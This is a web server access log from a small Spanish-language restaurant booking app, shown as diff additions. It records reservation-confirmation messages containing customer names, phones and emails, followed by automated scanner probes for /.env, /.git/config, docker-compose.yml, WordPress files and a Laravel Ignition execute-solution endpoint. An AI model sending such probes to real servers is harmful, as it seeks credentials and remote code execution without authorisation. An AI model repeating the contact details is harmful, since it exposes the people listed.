+127.0.0.1 - - [25/Oct/2022 01:06:13] "GET /send-message?msg=Restaurant_null._ID:_1%0A*¿Desea_confirmar_la_reservación?_ID:_22*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_TestRestaurant2,_tel:_092222222,_mail:_gamermaster@gmail.com%0A%0AResponde_'Rechazar_22'_para_rechazarla..%0AResponde_'Confirmar_22'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 01:10:52] "GET /send-message?msg=Restaurant_null._ID:_1%0A*¿Desea_confirmar_la_reservación?_ID:_23*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_TestRestaurant3,_tel:_092222222,_mail:_gamermaster@gmail.com%0A%0AResponde_'Rechazar_23'_para_rechazarla..%0AResponde_'Confirmar_23'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 01:14:45] "GET /send-message?msg=Restaurant_null._ID:_1%0A*¿Desea_confirmar_la_reservación?_ID:_24*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_TestRestaurant4,_tel:_092222222,_mail:_gamermaster@gmail.com%0A%0AResponde_'Rechazar_24'_para_rechazarla..%0AResponde_'Confirmar_24'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 01:20:55] "GET /send-message?msg=Restaurant_id_no_encontrado%0A*¿Desea_confirmar_la_reservación?_ID:_25*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_TestRestaurant5,_tel:_092222222,_mail:_gamermaster@gmail.com%0A%0AResponde_'Rechazar_25'_para_rechazarla..%0AResponde_'Confirmar_25'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 01:23:25] "GET /send-message?msg=Restaurant_null._ID:_1%0A*¿Desea_confirmar_la_reservación?_ID:_26*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_TestRestaurant5,_tel:_092222222,_mail:_gamermaster@gmail.com%0A%0AResponde_'Rechazar_26'_para_rechazarla..%0AResponde_'Confirmar_26'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 01:27:55] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 01:27:55] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:29:29] "GET /send-message?msg=Restaurant_null._ID:_1%0A*¿Desea_confirmar_la_reservación?_ID:_27*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_TestRestaurant5,_tel:_092222222,_mail:_gamermaster@gmail.com%0A%0AResponde_'Rechazar_27'_para_rechazarla..%0AResponde_'Confirmar_27'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 01:33:13] "GET /send-message?msg=Restaurant_muy_lindo._ID:_1%0A*¿Desea_confirmar_la_reservación?_ID:_28*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_TestRestaurant5,_tel:_092222222,_mail:_gamermaster@gmail.com%0A%0AResponde_'Rechazar_28'_para_rechazarla..%0AResponde_'Confirmar_28'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 01:36:47] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 01:36:48] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 01:39:03] "GET /send-message?msg=Restaurant_Riquisimo._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_29*_%0A%0ADía_2022-12-24,_11:00hs,_Cantidad_de_personas:_3%0Anull%0A%0AResponde_'Rechazar_29'_para_rechazarla..%0AResponde_'Confirmar_29'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 01:50:01] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_31*_%0A%0ADía_2022-12-24,_11:00hs,_Cantidad_de_personas:_3%0ANombre:_benja,_Tel:_1244,_Email:_benja@benja.com%0A%0AResponde_'Rechazar_31'_para_rechazarla..%0AResponde_'Confirmar_31'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 01:51:12] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 01:51:46] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_32*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Eugenia,_tel:_092123123,_mail:_eugematto@gmail.com%0A%0AResponde_'Rechazar_32'_para_rechazarla..%0AResponde_'Confirmar_32'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 01:51:54] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 01:54:47] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_33*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Franco,_tel:_099828311,_mail:_trenfran@gmail.com%0A%0AResponde_'Rechazar_33'_para_rechazarla..%0AResponde_'Confirmar_33'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 01:54:54] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 01:55:11] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 01:55:15] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 01:55:21] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 01:59:23] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 01:59:25] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:07:35] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_34*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com%0A%0AResponde_'Rechazar_34'_para_rechazarla..%0AResponde_'Confirmar_34'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:08:54] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_35*_%0A%0ADía_A2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com%0A%0AResponde_'Rechazar_35'_para_rechazarla..%0AResponde_'Confirmar_35'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:11:32] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_36*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com%0A%0AResponde_'Rechazar_36'_para_rechazarla..%0AResponde_'Confirmar_36'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:13:17] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_37*_%0A%0ADía_2022-10-15,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com%0A%0AResponde_'Rechazar_37'_para_rechazarla..%0AResponde_'Confirmar_37'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:14:32] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_38*_%0A%0ADía_2022-10-14,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com%0A%0AResponde_'Rechazar_38'_para_rechazarla..%0AResponde_'Confirmar_38'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:15:49] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_39*_%0A%0ADía_2022-10-14,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com%0A%0AResponde_'Rechazar_39'_para_rechazarla..%0AResponde_'Confirmar_39'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:16:49] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_40*_%0AHoy_a_las_,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com%0A%0AResponde_'Rechazar_40'_para_rechazarla..%0AResponde_'Confirmar_40'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:18:00] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_41*_%0AMañana_a_las_,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com%0A%0AResponde_'Rechazar_41'_para_rechazarla..%0AResponde_'Confirmar_41'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:18:10] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_42*_%0A%0ADía_2022-10-27,_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com%0A%0AResponde_'Rechazar_42'_para_rechazarla..%0AResponde_'Confirmar_42'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:19:04] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_43*_%0A%0ADía_2022-10-27_a_las_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Juanafecha,_tel:_099231211,_mail:_juanita@gmail.com%0A%0AResponde_'Rechazar_43'_para_rechazarla..%0AResponde_'Confirmar_43'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:19:14] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_44*_%0A%0AMañana_a_las_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Juanafecha,_tel:_099231211,_mail:_juanita@gmail.com%0A%0AResponde_'Rechazar_44'_para_rechazarla..%0AResponde_'Confirmar_44'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:19:17] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_45*_%0A%0AHoy_a_las_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Juanafecha,_tel:_099231211,_mail:_juanita@gmail.com%0A%0AResponde_'Rechazar_45'_para_rechazarla..%0AResponde_'Confirmar_45'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:21:55] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 02:22:33] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 02:23:37] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 02:23:38] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 02:23:38] "[33mGET /feed/ HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:23:39] "[33mGET /xmlrpc.php?rsd HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:23:39] "[33mGET /blog/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:23:39] "[33mGET /web/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:23:40] "[33mGET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:23:40] "[33mGET /wp/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:23:40] "[33mGET /2020/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:23:41] "[33mGET /2019/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:23:41] "[33mGET /2021/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:23:41] "[33mGET /shop/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:23:42] "[33mGET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:23:42] "[33mGET /test/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:23:42] "[33mGET /site/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:23:43] "[33mGET /cms/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:24:04] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_46*_%0A%0AHoy_25_a_las_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Alvarito,_tel:_099231211,_mail:_alva@gmail.com%0A%0AResponde_'Rechazar_46'_para_rechazarla..%0AResponde_'Confirmar_46'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:24:24] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_47*_%0A%0AMañana_26_a_las_11:00hs,_Cantidad_de_personas:_3%0ANombre:_benja,_Tel:_1244,_Email:_benja@benja.com%0A%0AResponde_'Rechazar_47'_para_rechazarla..%0AResponde_'Confirmar_47'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:24:40] "GET /send-message?msg=Restaurant_Punta_del_este._ID:_2%0A*¿Desea_confirmar_la_reservación?_ID:_48*_%0A%0ADía_2022-10-30_a_las_07:00hs,_Cantidad_de_personas:_1%0ANombre:_Pedro,_tel:_099231211,_mail:_pe@gmail.com%0A%0AResponde_'Rechazar_48'_para_rechazarla..%0AResponde_'Confirmar_48'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 02:30:02] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 02:30:14] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 02:32:53] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 02:33:15] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 02:35:29] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 02:35:30] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 02:38:20] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 02:39:09] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 02:39:21] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 02:39:26] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 02:39:36] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 02:39:42] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 02:39:49] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 02:39:58] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 02:40:08] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 02:40:11] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 02:48:16] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 03:06:25] "[33mGET /ReportServer HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:10:23] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 03:10:23] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:14] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 03:24:14] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 03:24:14] "[33mGET /wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:14] "[33mGET /xmlrpc.php?rsd HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:15] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 03:24:15] "[33mGET /blog/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:15] "[33mGET /web/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:15] "[33mGET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:15] "[33mGET /website/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:15] "[33mGET /wp/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:15] "[33mGET /news/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:15] "[33mGET /2018/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:16] "[33mGET /2019/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:16] "[33mGET /shop/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:16] "[33mGET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:16] "[33mGET /test/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:16] "[33mGET /media/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:16] "[33mGET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:16] "[33mGET /site/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:16] "[33mGET /cms/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:24:17] "[33mGET /sito/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 03:35:14] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 03:35:14] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 04:29:00] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 04:29:00] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 04:32:36] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 04:35:50] "[33mGET /config/getuser?index=0 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 04:42:28] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 04:42:28] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 04:48:00] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 05:33:56] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 05:33:57] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 05:39:03] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 05:39:05] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 05:39:05] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 05:39:06] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 05:39:08] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 05:39:09] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 05:41:37] "[33mGET /config/getuser?index=0 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 05:52:27] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 06:14:41] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 06:14:41] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 06:20:24] "[33mGET /.git/config HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 06:27:25] "[33mGET /config/getuser?index=0 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 06:49:22] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 06:49:22] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 07:17:04] "[33mHEAD /robots.txt HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 07:21:34] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 07:21:37] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 07:21:39] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 07:21:42] "[33mGET /robots.txt HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 07:27:28] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 08:33:38] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 08:33:39] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 08:37:16] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 08:37:17] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 08:40:56] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 08:44:51] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 09:01:04] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 09:08:05] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 09:17:34] "[33mGET /config/getuser?index=0 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:18:21] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 09:18:21] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:32:21] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 09:52:17] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 09:53:35] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 09:53:35] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 09:53:35] "[33mGET /wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:36] "[33mGET /xmlrpc.php?rsd HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:36] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 09:53:36] "[33mGET /blog/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:37] "[33mGET /web/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:37] "[33mGET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:37] "[33mGET /website/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:38] "[33mGET /wp/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:38] "[33mGET /news/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:38] "[33mGET /2018/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:39] "[33mGET /2019/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:39] "[33mGET /shop/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:39] "[33mGET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:40] "[33mGET /test/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:40] "[33mGET /media/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:40] "[33mGET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:41] "[33mGET /site/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:41] "[33mGET /cms/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:53:41] "[33mGET /sito/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 09:56:41] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 09:59:44] "[33mGET /manager/html HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:01:14] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 10:01:15] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:08:49] "[33mGET /docker-compose.yml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:09:03] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 10:09:04] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:53] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 10:15:53] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 10:15:53] "[33mGET /wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:54] "[33mGET /xmlrpc.php?rsd HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:54] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 10:15:54] "[33mGET /blog/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:55] "[33mGET /web/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:55] "[33mGET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:55] "[33mGET /website/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:56] "[33mGET /wp/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:56] "[33mGET /news/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:56] "[33mGET /2018/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:57] "[33mGET /2019/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
